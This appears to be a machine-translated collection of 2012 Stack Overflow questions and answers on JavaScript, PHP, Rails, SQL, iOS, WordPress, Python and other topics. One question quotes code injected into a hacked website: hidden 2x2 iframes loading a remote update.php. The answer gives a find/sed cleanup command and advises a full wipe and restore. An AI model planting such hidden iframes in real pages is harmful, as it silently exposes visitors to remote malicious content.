**但是**，您可以尝试一些东西（漂亮、漂亮、相当丑陋......）保持您的覆盖想法，但让它在屏幕上`function Object()`不可见的地方写入要跟踪的对象的详细信息。`<div>`

你去：跟踪而不持有对象的实际引用。但是您仍然需要实现一些查询函数来从该 div 检索信息并随着时间的推移清除它，否则您也会有泄漏。

或者您可以按照您的建议进行操作：创建一个通用构造函数和一个通用析构函数，但这需要您显式调用它们以从列表中删除对象。但是，如果发生任何意外，您的析构函数将不会被调用，因此您最终可能会以意想不到的方式泄漏很多。

很想知道其他人是否能想到替代方案。

# javascript - MVC和javascript之间的字符部分转义

> ID：13360808
> 
> 赞同：1
> 
> 时间：2012-11-13T12:30:06.447
> 
> 标签：javascript, asp.net-mvc, escaping

**背景**

在服务器端和客户端之间保持双反斜杠。

**查看模型**

```
MyViewModel.Users { get "'domain\\user1', 'domain\\user2'"; } 
```

**标记**

在我输出的页面上使用：

```
var userArray = [ @Html.Raw(Model.Users) ]; 
```

**问题**

观看源显示：

```
var userArray = [ 'domain\user1', 'domain\user2' ]; 
```

这会导致错误。我想保留单引号但双重转义反斜杠。

蒂亚……

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:31:26.123

双重转义反斜杠将`"\\\\"`在 C# 中。

这为您提供了一个具有两个反斜杠的内部字符串。

# php - var_dump 中的解析错误

> ID：13360815
> 
> 赞同：1
> 
> 时间：2012-11-13T12:30:37.180
> 
> 标签：php

我在以下代码中遇到解析错误：

```
<?php
// This:
$a = array( 'color' => 'red',
            'taste' => 'sweet',
            'shape' => 'round',
            'name'  => 'apple',
            4        // key will be 0
          );

$b = array('a', 'b', 'c');

// . . .is completely equivalent with this:
$a = array();
$a['color'] = 'red';
$a['taste'] = 'sweet';
$a['shape'] = 'round';
$a['name']  = 'apple';
$a[]        = 4;        // key will be 0

$b = array();
$b[] = 'a';
$b[] = 'b';
$b[] = 'c';

// After the above code is executed, $a will be the array
// array('color' => 'red', 'taste' => 'sweet', 'shape' => 'round', 
// 'name' => 'apple', 0 => 4), and $b will be the array 
// array(0 => 'a', 1 => 'b', 2 => 'c'), or simply array('a', 'b', 'c')

var_dump($a);
echo <br>
var_dump($b);
echo <br>
?> 
```

PHP 解析错误：语法错误，第 31 行 /home/ashish/NetBeansProjects/PhpProject1/index.php 中的意外“<”

上面的代码有什么问题？

* * *

好的，正确的休息方式是这样的。

```
echo "<br>"; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:31:36.200

您不能直接在 PHP 标记内输出 HTML。改用`echo`：

```
echo "<br>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:32:10.083

您不能随意混合 HTML 和 PHP（除非您不使用[XHP](http://www.facebook.com/notes/facebook-engineering/xhp-a-new-way-to-write-php/294003943919)），您必须关闭 php 或使用 echo

```
var_dump($a);?>
<br>
<?php var_dump($b);?>
<br> 
```

# javascript - 在 javascript 模板中使用 Rails 的视图助手

> ID：13360819
> 
> 赞同：1
> 
> 时间：2012-11-13T12:30:44.893
> 
> 标签：javascript, ruby-on-rails, template-engine, form-helpers, eco

我希望能够使用一些 rails 的视图和表单助手，例如`<%= image_tag .. %>`或`<%= select_tag .. %>`在我的 javascript 模板中。我读[了这个线程](https://stackoverflow.com/a/8317266/187907)，该线程建议将 erb 预渲染为某个 javascript 变量中的字符串，然后从模板中调用它（它必须在调用 js 模板之前可用）。所以我可以做这样的事情：

### view_helpers.js.erb

```
<script type="text/javascript">
  var ViewHelpers = {
      CountrySelect: "<%= select_tag "person[country_id]", options_from_collection_for_select(Country.all, "name", "id"), :prompt => '-Country-' %>"
  };
</script> 
```

然后从我的生态模板中调用它（稍后渲染）：

### edit_person.jst.eco

```
...
<p>
  <label for="person_country_id">Country</label>
  <%= ViewHelpers.CountrySelect %>
</p>
... 
```

但是，我似乎无法将其加载为视图的一部分或使用资产管道：

### 资产管道：application.js

（保存在 app/assets/javascripts/views/people/view_helpers.js.erb 中）

```
//= require ./views/people/view_helpers 
```

## 或者

### ERB 模板：views/people/index.html.erb

（保存在 app/views/people/view_helpers.js.erb 中）

```
<%= render :template => 'people/view_helpers' %> 
```

我是完全错误地处理这个问题还是我错过了什么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:42:11.080

是的，这是可能的。您甚至可以将其与部分一起使用：

update_js.js.erb：

```
$('#element').html('<%= escape_javascript(render(:partial => @partial, :locals => {:my_var => @item })) %>'); 
```

在控制器中，您应该具有格式`js`：

```
 respond_to do |format|
      format.js do
        render :update_js do |page|
          page.replace_html "element", :partial => @partial
        end
      end
    end 
```

如果你想用 AJAX 调用这个 js，只需传递`:remote => true`给你的链接

```
<%= link_to 'replace content', item_path(@item), :remote => true %> 
```

# php - linux上的代码注入帮助搜索和替换

> ID：13360827
> 
> 赞同：0
> 
> 时间：2012-11-13T12:31:20.970
> 
> 标签：php, linux

我的网站被黑客入侵并注入了一些这样的代码

```
<i>
    <iframe src="http://www.cascadecowcutters.org/wp-content/upgrade/update.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.cascadecowcutters.org/wp-content/upgrade/update.php" width="2" height="2" frameborder="0"></iframe>
</i> 
```

linux中有没有办法搜索并将这段代码替换为这个''？递归地

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T14:38:53.047

To 'find' all files and search and replace on those files:

`find ./ -type f | xargs sed -i 's/string1/string2/g'`

As Joakim mentioned in his comment, anytime you are dealing with a compromised server it is safest to do a complete wipe <> restore. Before restoration make sure to check for exploits. Make sure you know all your web apps are at their most recent version.

# ios - 如果网络不可用，Game Center / GameKit 报告分数

> ID：13360828
> 
> 赞同：5
> 
> 时间：2012-11-13T12:31:21.487
> 
> 标签：ios, game-center, gamekit, achievements, leaderboard

我正在创建支持 Game Center 的应用程序之类的游戏。当玩家正确地通过游戏中心验证但网络（wifi 或蜂窝网络）在我想要报告我的分数时不可用时，我在向排行榜报告分数时遇到问题。

我的应用程序适用于 iOS 5.0 及更高版本，根据文档 - [排行榜](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/GameKit_Guide/LeaderBoards/LeaderBoards.html#//apple_ref/doc/uid/TP40008304-CH6-SW13)- 它应该像他们说的那样工作 - 我只使用该功能

```
- (void)reportScoreWithCompletionHandler:(void (^)(NSError *error))completionHandler and 
```

和

> 如果由于某种原因由于网络错误而无法报告分数，Game Kit 会在网络可用时自动重新发送数据。

**但是**当我在这种离线模式下关闭wifi，玩我的游戏并报告分数时，我重新在线时没有报告我的分数！:( 我的成就也有同样的问题。有什么技巧或已知问题吗？或者此功能仅适用于实时应用程序而不用于测试？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-05T16:45:46.737

我一直看到一些类似的问题。这不是答案，但可能会指出问题所在。与 NathanChristie 的回答相反，您可以在禁用 WiFi 时进行身份验证，因为我刚刚使用飞行模式尝试了同样的事情，即使没有网络也能够让我的用户通过身份验证。同样发生的情况是，Game Center 似乎缓存了我的成就的旧版本，并在被询问时显示这些成就。如果您尝试报告成就或排行榜更新并且数据的缓存版本无法识别它，那么它可能会忽略更新。如果我得到更多信息，我会更新。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-13T03:03:15.313

禁用 Internet 连接后，您将无法通过 Game Center 进行身份验证。如果从来没有任何身份验证，您将无法利用 Apple 的自动重新提交。它们支持用户成功通过身份验证然后网络变得不可用的用例。

基本上，如果您在通过`reportScore:forLeaderboardID:`身份验证后调用，无论您是否有网络连接，Apple 都应该（在某个未定义的时间/间隔）自动提交您的分数对象。

# html - HTML5 视频仅适用于 IE。其他浏览器显示黑屏

> ID：13360830
> 
> 赞同：2
> 
> 时间：2012-11-13T12:31:34.430
> 
> 标签：html, video, cross-browser, html5-video, video.js

我必须开发一个在所有主要浏览器（Chrome、Firefox、IE9、Safari 和 Opera）上运行的 html5 应用程序，并且要求它也能够播放视频。我正在使用他们提供的视频标签和 2 种不同格式的视频：

```
<video width="640" height="360" controls autoplay="autoplay">
    <source src="../videos/grafico.ogg" type="video/ogg"/>
    <source src="../videos/grafico.mp4" type="video/mp4"/>
    Your browser doesn't support video
</video> 
```

我的问题是这只能在 IE 上运行。在 Chrome、Firefox 和 Opera 上，它会打开播放器，但图像是黑色的。在 Safari 上，它只显示“您的浏览器不支持视频”消息。我也尝试过使用videojs，但黑屏问题仍然存在。顺便说一句，这是在本地播放时发生的（我无权访问服务器）。

我不知道自己做错了什么，也没有太多关于如何处理视频的知识。有谁知道我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T19:08:03.393

首先，您需要先放置 MP4 源。在较旧的 iPad 上存在一个问题，即它们无法查看列表中的第一个来源。

对于 Chrome、Firefox 和 Opera，这可能是 ogg 文件本身的问题，或者是服务器为该文件发送的 MIME 类型的问题。检查以确保 ogg 可以在其他地方播放，例如 VLC。

如果是，请将扩展名更改为 .ogv。这不应该有什么不同，但它更正确。然后将这些行添加到您的 .htaccess 文件中。这是来自[HTML5 Boilerplate](http://html5boilerplate.com)。

```
# Audio
AddType audio/mp4                      m4a f4a f4b
AddType audio/ogg                      oga ogg

# Video
AddType video/mp4                      mp4 m4v f4v f4p
AddType video/ogg                      ogv
AddType video/webm                     webm
AddType video/x-flv                    flv 
```

这似乎是 ogg 文件不能在人们的 HTML5 视频中播放的 #1 原因。

作为旁注，您可能还需要考虑制作一个 WebM 文件，或者使用而不是 Ogg。它具有更好的压缩质量比。您可以使用[Firefogg.org](http://firefogg.org)免费制作 WebM。

我不明白为什么 IE 会播放 MP4 而 Safari 不会，但希望这些也能解决这个问题。干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:41:45.717

```
<video width="320" height="240" controls="controls" autoplay="autoplay"> 
```

试试这个方法。为我在所有浏览器中测试并有效。

# sql - 包含所有匹配项的简单 SQL 选择

> ID：13360832
> 
> 赞同：2
> 
> 时间：2012-11-13T12:31:35.960
> 
> 标签：sql, tsql, relational-division

SQL问题：我有两列的表：`ProductId`和`CatId`

我想选择属于所有传入`CatId`s的产品。

例如这是我的表：

```
ProductID        CatID
_____________________
1129                2
1129                3
1129                4
1130                2
1130                3 
```

现在，如果我通过`2,3,4`结果应该是`1129`.

如果我通过`2,3`结果应该是`1130`（不是 1129，因为它应该属于所有通过的 CatId，不少于 - 不多）

知道如何实现吗？不能工作`IN`。with不会达到目的。`AND``IN``OR`

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:38:10.080

```
SELECT ProductID
FROM Table1 a
WHERE CatID IN (2,3)
GROUP BY ProductID
HAVING COUNT(*) =
        (
          SELECT COUNT(*)
          FROM table1 b
          WHERE b.ProductID = a.ProductID
        ) AND 
        COUNT(*) = 2 
```

*   [SQLFiddle 演示（*包括 2 个查询*）](http://sqlfiddle.com/#!3/29aeb/5)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-13T12:35:05.677

诀窍是查看产品属于多少类别，按 productId 分组，然后使用`HAVING`类别的较小子集过滤结果

```
SELECT ProductID, COUNT(*) as c FROM table WHERE CatID IN(2,3,4) GROUP BY ProductID HAVING c = 3 
```

# objective-c - UIKeyboardWillShowNotification 广播时如何知道是否使用了 iPad 蓝牙键盘？

> ID：13360834
> 
> 赞同：0
> 
> 时间：2012-11-13T12:31:43.377
> 
> 标签：objective-c, ios, ipad

当用户可以使用键盘时，通知`UIKeyboardWillShowNotification`会正确广播。

发生这种情况时，我调用了我的委托方法，但我怎么知道它是否是蓝牙键盘？

谢谢

**更新**

```
[[NSNotificationCenter defaultCenter] addObserver:self
 selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification
 object:nil]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:58:34.473

如果存在蓝牙键盘，则不会广播该通知（UIKeyboardWillShowNotification），除非您有 inputAccessoryView。事实上，这是唯一知道的方法。如果您使用它来调整软件键盘的视图，您应该根据此通知进行处理，您将永远没问题。

否则，您可以在通知的 userInfo 属性中检查键盘大小差异。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-27T01:26:15.603

该信息在 userInfo 字典中可用，它只需要一些操作即可获得您想要的。

```
NSDictionary *userInfo = [aNotification userInfo];
CGRect startKeyboardRect  = [[userInfo objectForKey:UIKeyboardFrameBeginUserInfoKey] CGRectValue];
CGRect finishKeyboardRect = [[userInfo objectForKey:UIKeyboardFrameEndUserInfoKey] CGRectValue];

startKeyboardRect   = [self.view convertRect:startKeyboardRect fromView:self.view.window];
finishKeyboardRect  = [self.view convertRect:finishKeyboardRect  fromView:self.view.window];

CGFloat vertShuffle = startKeyboardRect.origin.y - finishKeyboardRect.origin.y; 
```

# sencha-touch - 网络矩阵中的煎茶触摸

> ID：13360836
> 
> 赞同：0
> 
> 时间：2012-11-13T12:31:51.903
> 
> 标签：sencha-touch, webmatrix, iis-express

我正在 WebMatrix 中尝试煎茶触摸，但没有取得太大成功。sencha 库中的所有内容都已下载并且 IISExpress 运行正常，但是当我浏览到 index.html 时，我在浏览器中显示以下内容？

```
Ext.application({
    name: 'Sencha',

    controllers: ['Main'],
    views:  ['Main'],
    stores: ['MoreCards'],

    launch: function() {
        Ext.Viewport.add({
            xclass: 'Sencha.view.Main'
        });
    }
}); 
```

有什么想法吗？WebMatrix 没有显示任何错误，Chrome 也没有？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T20:50:23.053

我最终弄清楚了问题所在。基本上 IISExpress 看到 app.js 并假设您正在处理一个 NodeJS 项目，该项目将处理程序信息添加到 web.config 中。在使用现有 app.js 文件创建新项目时选择取消 NodeJS 设置，或删除 web.config 文件中的 NodeJS 配置部分。

# c++ - c++ 将 2 个或多个字符串分组为一个输入

> ID：13360837
> 
> 赞同：0
> 
> 时间：2012-11-13T12:31:53.460
> 
> 标签：c++, string, variables

> **可能重复：**
> [将多个单词提取到一个字符串变量](https://stackoverflow.com/questions/2119080/extract-multiple-words-to-one-string-variable)
> [中，更改 cin (c++) 的分隔符](https://stackoverflow.com/questions/7302996/changing-the-delimiter-for-cin-c)

我在使用 cin 时遇到问题。我的代码：

```
cout << "Enter Main Keyword: ";
    cin >> mainKeyword;
    cout << "==========" << endl;

    cout << "Enter Secondary Keyword: ";
    cin >> secondaryKeyword; 
```

当我为 mainKeyword 变量输入“关键字”（不带引号）时，程序会自动将“key”分配给 mainKeyword，将“word”分配给 secondaryKeyword，让程序将两个或多个字符串视为一个输入的代码是什么?

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:35:00.977

如果要读取整行输入，请使用`getline`：

```
getline(cin, mainKeyword); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:34:10.647

的默认分隔符`cin`是空格，要更改它，请参阅这个 SO 问题：

[更改 cin (c++) 的分隔符](https://stackoverflow.com/questions/7302996/changing-the-delimiter-for-cin-c)

或者`getline`自己使用和执行任何拆分。

# ruby - Rails“嵌套”关联搜索

> ID：13360838
> 
> 赞同：0
> 
> 时间：2012-11-13T12:31:55.337
> 
> 标签：ruby, ruby-on-rails-3

这个问题一定已经被问过百万次了，但我就是找不到答案:(

假设我有 3 个模型：

```
class Country
  has_many :cities
end

class City
  has_many :companies
end

class Company
  belongs_to :city
end 
```

我可以通过 获取给定城市中的公司`City.first.companies`，但我想要的是能够获取给定国家/地区的所有公司，例如`Country.first.companies`

我能够实现的是在`Country`模型中编写一个方法：

```
 def companies
   @companies = []
   cities.all.each{ |c| @companies << c.companies unless c.companies.empty? }
   @companies
 end 
```

但它返回 Company 对象数组的数组。我还可以将`country_id`列添加为 Country 模型的 FK，例如

```
class Country
  has_many :cities
  has_many :companies
end

class Company
  belongs_to :city
  belongs_to :country
end 
```

但这看起来不是很干燥。

我想接收给定国家/地区的公司对象数组。我很确定有一种 Rails 方法可以实现这一点。那会是什么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:37:29.760

使用`has_many through`关联。

```
class Country
  has_many :companies, :through => :cities 
```

现在您可以使用`Country.last.companies`.

# assembly - Direct3D 像素着色器汇编语言中的 Swizzling 操作

> ID：13360839
> 
> 赞同：2
> 
> 时间：2012-11-13T12:31:55.653
> 
> 标签：assembly, shader, gpu, direct3d, hlsl

我编写了一个像素着色器（3.0 版）并使用 fxc 命令对其进行了编译。编译没有问题，但有一点我无法理解。

有一些 swizzling 操作具有未记录的行为。这是一个例子：

添加 r1.xyz，-r0.z，c3

（r1.xyz 的长度为 3，-r0.z 的长度为 1，c3 的长度为 4）

任何人都知道当操作数/结果寄存器长度不同时，哪个值将写入 r1 的每个向量分量？

[http://msdn.microsoft.com/en-us/library/windows/desktop/bb172242(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb172242(v=vs.85).aspx)上的文档并不清楚这种情况。文档的某些部分说，如果操作数的通道字母少于结果，则重复最后一个字母。但是，它没有说明当操作数的字母多于结果或操作数根本没有字母（并且结果没有 4 个组件）时会发生什么。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T21:49:33.137

结果将是：r1.xyz = -r0.zzz + c3.xyz

阅读[http://msdn.microsoft.com/en-us/library/windows/desktop/bb219869(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb219869(v=vs.85).aspx) 和 [http://msdn.microsoft.com/en-us/library/windows/桌面/bb219870(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb219870(v=vs.85).aspx)

# javascript - 查找某些文本并添加 css

> ID：13360844
> 
> 赞同：0
> 
> 时间：2012-11-13T12:32:26.663
> 
> 标签：javascript, jquery, css

我有这样一段文字：

```
<li>certain text</li> 
```

现在我想给写着“文本”的那块上色。有了这个，我可以找到完整的文本：

```
$(function() {
    var color = $('*:contains("text")');
    color.css("color", "red");
}); 
```

问题是这段代码将完整的文本变成了红色。我怎样才能只得到写着“文本”的那部分并在那部分做 css？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:34:29.680

您需要更改`li`内容，因为浏览器只能将样式应用于元素，而不是单词。

你可以这样做：

```
$('li:contains("text")').each(function(){
    var licontent = $(this).html();
    licontent = licontent.replace(new RegExp("text", "g"), '<span style="color:red">text</span>');
    $(this).html(licontent);
}); 
```

[示范](http://jsfiddle.net/dystroy/WspMa/)

小心`*`选择器。你需要明白它会让你所有的父母`li`，包括文件......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:35:49.917

您可以这样做，但未经测试：

```
$(function() {
    var color = $('body').text('text');
    color.css("color", "red");
}); 
```

# wordpress - Wordpress 同时保存多个设置部分

> ID：13360846
> 
> 赞同：4
> 
> 时间：2012-11-13T12:32:36.417
> 
> 标签：wordpress

我为 WordPress 插件创建了一个设置页面。

然后我为同一页面创建了两个设置部分：

```
add_plugins_page(
    __('API Settings', 'api'),
    __('API Settings', 'api'),
    'administrator',
    'api',
    array('API', 'settings_display')
);

// add general settings section
add_settings_section(
    'api_general',
    __('General Settings', 'api'),
    array('API', 'section_callback'),
    'api'
);

// add page section
add_settings_section(
    'api_pages',
    __('Set API pages', 'api'),
    array('API', 'section_callback'),
    'apis'
); 
```

然后使用 add_settings_field() 将各种字段添加到不同的部分。

处理页面呈现的函数如下所示：

```
<!-- Create a header in the default WordPress 'wrap' container -->
<div class="wrap">
    <!-- Add the icon to the page -->
    <?php screen_icon(); ?>
    <h2><?php _e('API Settings', 'api'); ?></h2>
    <!-- Make a call to the WordPress function for rendering errors when settings are saved. -->
    <?php settings_errors(); ?>
    <!-- Create the form that will be used to render our options -->
    <form method="post" action="options.php">
        <?php settings_fields('api_pages'); ?>
        <?php settings_fields('api_general'); ?>
        <?php do_settings_sections('api'); ?>
        <?php submit_button(); ?>
    </form>
</div><!-- /.wrap --> 
```

然后当我尝试保存页面设置时，它只会保存 api_general 设置。

我发现 settings_fields() 实际上只是为了输出特定部分的 nonce、action 和 option_page 字段。因此，当我为两个不同的部分调用它时，一个部分的输出基本上会忽略前一部分。

我做了一些研究并查看了教程，但我还没有找到一个显示必须同时保存多个部分的教程。但是由于 do_settings_sections() 输出页面的所有部分，因此必须有一种方法可以同时保存所有部分。

我唯一的其他办法是将所有字段合并到同一部分或创建单独的页面，如果可能的话我想避免这些页面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-29T12:05:42.730

也许这会有所帮助....根据此法典：[settings_fields](http://codex.wordpress.org/Function_Reference/settings_fields)

settings_fields 函数的第一个参数应该是在 register_setting 中声明的设置组。

但看起来您正在使用设置部分的名称，所以我什至不确定它是如何工作的。

一个页面上可以有两个或多个部分，但所有设置（即选项），无论它们位于哪个部分，都必须属于表单中的同一设置组。组的隐藏字段（单数）通过神奇的“settings_field”函数插入到表单的顶部。

但是，您也可以在一个页面上拥有多个表单，每个表单都有自己的提交按钮和 settings_fields('optiongroup')，但我个人认为页面上的多个提交按钮会让用户感到非常困惑。

据我了解，限制因素是之间存在 1 对 1 对 1 的对应关系：

*   页面上的表单
*   该表单中的提交按钮
*   该表单中的 settings_fields

settings_fields() 确定将在幕后保存的内容。使用一系列选项而不是单个选项更有效。我还没有尝试过，但是为了从逻辑上拆分表单上的部分，将一组选项与每个设置部分相关联是有意义的。然后每个部分 (n) 将有自己的 get_options('section-(n)') 来获取其所有字段的值数组。但仍然（有过度重复的风险），当每个页面上的一个表单按下一个提交按钮时，包含每个部分中所有字段值的每个选项数组都会立即保存。

哇！:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-22T13:44:46.720

据我了解，不可能在一页上有多个设置部分并保存所有部分的数据。一个解决方案是使用标签，[http://wp.smashingmagazine.com/2011/10/20/create-tabs-wordpress-settings-pages/](http://wp.smashingmagazine.com/2011/10/20/create-tabs-wordpress-settings-pages/)应该让你开始使用标签。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-02T16:51:00.933

我实际上能够让它工作。对我来说，关键是确保 register_setting() 对组使用相同的 slug，即使部分不同。本质上，我将第一部分的 slug 用作第一个参数，而不是每个部分的 slug。在我的设置中，这是使用我所谓的“页面”变量，因为我用它来定义选项页面。

我的部分和字段定义如下：

```
$sections=>array(
...

    'page_vars'=>array(
      'slug'=>'page_vars',
      'label'=>'Page Layout Variables',
    ),
    'display_defaults'=>array(
      'slug'=>'display_defaults',
      'label'=>'Display Defaults',
      'page' =>'page_vars',
    ),
    'blog_defaults'=>array(
      'slug'=>'blog_defaults',
      'label'=>'Blog Display Defaults',
      'page' =>'page_vars',
    ),

...
); 
```

对应的字段：

```
$fields=>arry(
....
  'max_page_width'=>array(
      'slug'=>'max_page_width',
      'label'=>'Maximum width for page (Including header images - include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'100vw'),
    ),
    'xl_max_body_width'=>array(
      'slug'=>'xl_max_body_width',
      'label'=>'Default content width for XL Screens (include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'1600px'),
    ),
    'lg_max_body_width'=>array(
      'slug'=>'lg_max_body_width',
      'label'=>'Default content width for LG Screens (include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'95vw'),
    ),
    'md_max_body_width'=>array(
      'slug'=>'md_max_body_width',
      'label'=>'Default content width for MD Screens (include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'95vw'),
    ),
    'sm_max_body_width'=>array(
      'slug'=>'sm_max_body_width',
      'label'=>'Default content width for SM Screens (include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'95vw'),
    ),
    'xs_max_body_width'=>array(
      'slug'=>'xs_max_body_width',
      'label'=>'Default content width for XS Screens (include unit)',
      'section'=>'page_vars',
      'args'=>array('default'=>'95vw'),
    ),
    'display_header'=>array(
      'slug'=>'display_header',
      'label'=>'Display auto-generated page heading by default',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_title'=>array(
      'slug'=>'display_title',
      'label'=>'Display auto-generated page title by default',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_meta'=>array(
      'slug'=>'display_meta',
      'label'=>'Display auto-generated page meta by default',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_thumb'=>array(
      'slug'=>'display_thumb',
      'label'=>'Display thumbnail at top of post',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_page_comments'=>array(
      'slug'=>'display_page_comments',
      'label'=>'Display comments on pages',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_post_comments'=>array(
      'slug'=>'display_post_comments',
      'label'=>'Display comments on posts',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_sidebar'=>array(
      'slug'=>'display_sidebar',
      'label'=>'Display sidebar by default',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'mobile_sidebar'=>array(
      'slug'=>'mobile_sidebar',
      'label'=>'Display sidebar on Mobile Devices',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'display_footer'=>array(
      'slug'=>'display_footer',
      'label'=>'Display footer by default',
      'section'=>'display_defaults',
      'page' =>'page_vars',
    ),
    'blog_display_header'=>array(
      'slug'=>'blog_display_header',
      'label'=>'Display auto-generated page heading by default',
      'section'=>'blog_defaults',
      'page' =>'page_vars',
    ),
    'blog_display_title'=>array(
      'slug'=>'blog_display_title',
      'label'=>'Display auto-generated page title by default',
      'section'=>'blog_defaults',
      'page' =>'page_vars',
    ),
    'blog_display_filter'=>array(
      'slug'=>'blog_display_filter',
      'label'=>'Display post filter above content',
      'section'=>'blog_defaults',
      'page' =>'page_vars',
    ),
...
); 
```

然后我添加了一些处理函数来添加/注册部分和字段：

```
 // set up options record in database

  foreach ($sections as $section=>$def){
    $page = (isset($def['page']))? $def['page'] : $def['slug'];
    add_settings_section(
      'trs_harvest_'.$def['slug'],
      __('','trs-harvest'),
      array($this,$def['slug'].'_settings_cb'),
      'trs_harvest_'.$page
    );
  }

  foreach ($fields as $field=>$def){
    $page = (isset($def['page']))? $def['page'] : $def['section'];
    $args = (isset($def['args']))? $def['args'] :null;
    register_setting('trs_harvest_'.$page,'hvst_'.$def['slug'],$args);
    add_settings_field(
      'hvst_'.$def['slug'],
      __($def['label'],'trs-harvest'),
      array($this,$def['slug'].'_cb'),
      'trs_harvest_'.$page,
      'trs_harvest_'.$def['section'],
      array('label_for'=>'hvst_'.$def['slug'])
    );
  } 
```

最后，当我添加选项页面时，我确保 settings_fields() 使用了第一部分（*重要说明是第一部分驱动这里的 nonce 字段）并且只创建了一组 settings_field() 和 _submit_button() 输出这页纸。：

将其用作 $sections：

```
array('trs_harvest_page_vars','trs_harvest_display_defaults','trs_harvest_blog_defaults') 
```

以及此代码来设置选项页面输出：

```
 settings_fields( $sections[0]);
        foreach ($sections as $section){
            do_settings_sections( $section);
          }
          echo('</div>');
          submit_button('Save Settings'); 
```

这给了我一个包含多个部分的选项页面，我可以使用单个提交按钮保存这些部分。

# python - 翻译 python 应用程序

> ID：13360848
> 
> 赞同：0
> 
> 时间：2012-11-13T12:32:50.183
> 
> 标签：python

我写了一个简单的程序，我想根据当前的语言环境翻译成不同的语言，但我无法让它工作

我正在关注各种网站。这是其中之一：[翻译你的蟒蛇](http://www.learningpython.com/2006/12/03/translating-your-pythonpygtk-application/)

在执行时我没有任何问题，直到我得到语言环境不可用并且它必须使用“C”语言环境

所以，我可以得到带有 glade 和 non glade 字符串的 pot 编译文件。这是网站上写在我的程序上的内容：

我检查的一件事是 os.environ.get 正在返回类似 es_ES.UTF-8 的内容，然后代码说要放置默认值而不使用 .UTF-8

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

import gi
from gi.repository import Gtk
import subprocess, sys, os
import threading
import gettext

# # Algunas cosas para gettext (para las traducciones)
APP_NAME="welcn"

WELCN_DIR = '/home/pruebas/welcn-0.1/'

class main():

    def __init__(self):

        #Translation stuff

        #Get the local directory since we are not installing anything
        self.local_path = os.path.realpath(os.path.dirname(sys.argv[0]))
        # Init the list of languages to support
        langs = []
        #Check the default locale
        lc, encoding = locale.getdefaultlocale()
        if (lc):
            #If we have a default, it's the first in the list
            langs = [lc]
        # Now lets get all of the supported languages on the system
        language = os.environ.get('LANG', None)
        if (language):
            """langage comes back something like en_CA:en_US:en_GB:en
            on linuxy systems, on Win32 it's nothing, so we need to
            split it up into a list"""
            langs += language.split(":")
        """Now add on to the back of the list the translations that we
        know that we have, our defaults"""
        langs += ["en_CA", "en_US"]

        """Now langs is a list of all of the languages that we are going
        to try to use.  First we check the default, then what the system
        told us, and finally the 'known' list"""

        gettext.bindtextdomain(APP_NAME, self.local_path)
        gettext.textdomain(APP_NAME)
        # Get the language to use
        self.lang = gettext.translation(APP_NAME, self.local_path
            , languages=langs, fallback = True)
        """Install the language, map _() (which we marked our
        strings to translate with) to self.lang.gettext() which will
        translate them."""
        _ = self.lang.gettext

        builder = Gtk.Builder()
        builder.add_from_file(WELCN_DIR + "welcn.ui")

        #### Language and Keymap window
        self.window = builder.get_object("window1")
        self.button_try = builder.get_object("button1")
        self.button_cli_installer = builder.get_object("button2")

        self.window.connect("delete-event", Gtk.main_quit)
        builder.connect_signals(self)
        self.window.set_title(_('Welcome!'))
        self.window.set_position(Gtk.WindowPosition.CENTER)

        self.window.show_all()

    def on_button1_clicked(self, widget, data=None):
        Gtk.main_quit()

    def on_button2_clicked(self, widget, data=None):
        subprocess.Popen(["cinnarch-setup"])
        sys.exit(0)

if __name__ == '__main__':
    main()
    Gtk.main() 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:58:01.280

你`import locale`在这个代码文件的任何地方做过吗？

